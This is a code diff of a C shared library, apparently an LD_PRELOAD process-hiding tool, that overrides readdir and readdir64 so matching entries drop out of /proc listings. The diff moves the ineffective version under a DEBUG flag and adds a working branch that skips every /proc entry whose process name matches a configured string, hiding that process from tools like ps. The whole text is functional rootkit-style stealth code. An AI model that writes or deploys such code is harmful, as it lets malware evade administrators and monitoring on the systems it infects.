@@ -51,7 +51,7 @@ static int get_process_name(char* pid, char* buf)
     sscanf(tmp, "%d (%[^)]s", &unused, buf);
     return 1;
 }
-
+#ifdef DEBUG
 #define DECLARE_READDIR(dirent, readdir)								\
 static struct dirent	*(*original_##readdir)(DIR *) = NULL;			\
 																		\
@@ -81,14 +81,48 @@ struct dirent*readdir(DIR *dirp)										\
 				&& strncmp(procName, processToExclude, strlen(processToExclude)) == 0){			\
 					/*dprintf(1, "PROCESS HIDDEN: pid=%s", dir->d_name);*/	\
 					break ;												\
-					/*continue ;*/										\
 					}													\
 		}																\
 		break ;															\
 	}																	\
 	return dir;															\
 }
-
+#else
+#define DECLARE_READDIR(dirent, readdir)								\
+static struct dirent	*(*original_##readdir)(DIR *) = NULL;			\
+																		\
+struct dirent*readdir(DIR *dirp)										\
+{																		\
+	char			dirName[256];										\
+	char			procName[256];										\
+	struct dirent	*dir;												\
+																		\
+	if (original_##readdir == NULL)										\
+	{																	\
+		original_##readdir = dlsym(RTLD_NEXT, #readdir);				\
+		if (original_##readdir == NULL)									\
+		{																\
+			fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
+			return 0;													\
+		}																\
+	}																	\
+	while (1)															\
+	{																	\
+		dir = original_##readdir(dirp);									\
+		if (dir)														\
+		{																\
+			if (get_dir_name(dirp, dirName, sizeof(dirName))			\
+				&& strcmp(dirName, "/proc") == 0						\
+				&& get_process_name(dir->d_name, procName)				\
+				&& strncmp(procName, processToExclude, strlen(processToExclude)) == 0){			\
+					continue ;										\
+					}													\
+		}																\
+		break ;															\
+	}																	\
+	return dir;															\
+}
+#endif
 DECLARE_READDIR(dirent64, readdir64);
 DECLARE_READDIR(dirent, readdir);
 
